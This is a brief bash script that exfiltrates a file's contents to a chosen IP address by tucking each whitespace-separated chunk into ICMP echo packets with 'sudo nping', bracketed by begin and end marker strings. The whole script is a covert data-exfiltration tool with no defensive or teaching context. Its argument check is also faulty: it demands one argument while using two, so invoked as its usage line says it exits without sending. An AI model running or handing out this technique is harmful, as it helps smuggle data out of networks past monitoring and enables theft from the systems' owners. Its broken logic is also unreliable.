#!/bin/bash

if [ "$#" -ne 1 ]; then
	echo "Usage: $0 <file path> <IP address>"
	exit
fi

data=$(cat $1)
sudo nping --icmp -c 1 $2 --data-string "BOFfile.txt"
for line in $data; do
	sudo nping --icmp -c 1 $2 --data-string "$line"
done
sudo nping --icmp -c 1 $2 --data-string "EOFfile.txt"
exit

